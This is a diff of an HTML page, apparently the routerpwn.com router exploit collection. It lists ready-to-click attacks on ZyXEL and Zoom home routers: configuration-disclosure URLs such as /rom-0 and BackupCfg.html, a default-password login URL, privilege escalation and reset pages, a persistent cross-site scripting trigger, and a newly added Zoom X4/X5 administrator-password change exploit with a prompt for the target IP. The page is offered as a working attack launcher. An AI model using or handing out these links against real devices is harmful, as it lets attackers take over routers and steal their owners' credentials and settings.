 	<div><a href="http://192.168.1.1/cgi-bin/ExportCurrentSettings?exportsetting=1">G-570S configuration disclosure</a></div>
-	<div><a href="javascript:setip('/cgi-bin/ExportCurrentSettings?exportsetting=1')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/ExportCurrentSettings?exportsetting=1')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>03/03/08</div>
 	<div><a href="http://www.gnucitizen.org/static/blog/2008/04/hacking_zyxel_gateways_part_2.pdf">[+]</a></div>
 	<div><a href="http://192.168.1.1/BackupCfg.html">Prestige configuration disclosure</a></div>
-	<div><a href="javascript:setip('/BackupCfg.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/BackupCfg.html')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/19/08</div>
 	<div><a href="http://www.packetstormsecurity.org/papers/attack/Hacking_ZyXEL_Gateways.pdf">[+]</a></div>
 	<div><a href="http://192.168.1.1/rpSysAdmin.html">Prestige privilege escalation</a></div>
-	<div><a href="javascript:setip('/rpSysAdmin.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/rpSysAdmin.html')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>00/00/0?</div>
 	<div></div>
 	<div><a href="http://user:1234@192.168.1.1/">Prestige default password</a></div>
-	<div><a href="javascript:zyxeldefault()">[IP]</a></div>
+	<div><a href="javascript:zyxeldefault()">[SET IP]</a></div>
 </article>
 	
 <article>
 	<div>00/00/0?</div>
 	<div><a href="http://everlost.nl/kender/zyxel/">[+]</a></div>
 	<div><a href="http://192.168.1.1/rom-0">ZyNOS configuration disclosure</a></div>
-	<div><a href="javascript:setip('/rom-0')">[IP]</a></div>
+	<div><a href="javascript:setip('/rom-0')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>10/08/07</div>
 	<div><a href="http://louhisecurity.fi//advisory/zyxel_070810.txt">[+]</a></div>
 	<div><a href="javascript:zyxelxss()">Zywall2 Persistent Cross Site Scripting</a></div>
-	<div><a href="javascript:zyxelxssr()">[IP]</a></div>
+	<div><a href="javascript:zyxelxssr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>11/21/04</div>
 	<div><a href="http://www.securityfocus.com/archive/1/381835/30/0/threaded">[+]</a></div>
 	<div><a href="http://192.168.1.1/rpFWUpload.html">Prestige unauthorized reset</a></div>
-	<div><a href="javascript:setip('/rpFWUpload.html')">[IP]</a></div>
+	<div><a href="javascript:setip('/rpFWUpload.html')">[SET IP]</a></div>
+</article>
+<div style="float: right"><a href="#">^ Top</a></div>
+</section><br><br><section id="zoom">
+<h2>Zoom</h2>
+<h3><a href="javascript:img('Zoom X4')">Zoom X4</a>, <a href="javascript:img('Zoom X5')">Zoom X5</a></h3>
+
+<article>
+	<div>07/10/13</div>
+	<div><a href="http://www.exploit-db.com/exploits/26736/">[+]</a></div>
+	<div><a href="javascript:zoomX_changeadminpass()">X4 and X5 ADSL change administrator password</a></div>
+	<div><a href="javascript:zoomX_changeadminpass(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section>
@@ -2809,5 +3517,14 @@ function GenArrisPasswords(startdate, enddate) {
 		<a href=http://www.websec.mx/?routerpwn.com target=_blank><img src=http://www.websec.mx/img/banners/A728x90px.jpg  border=0></a><br/><br/>
 		<a href="#">^ Top</a>
 	</footer>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}</script>
 	</body>
 </html>
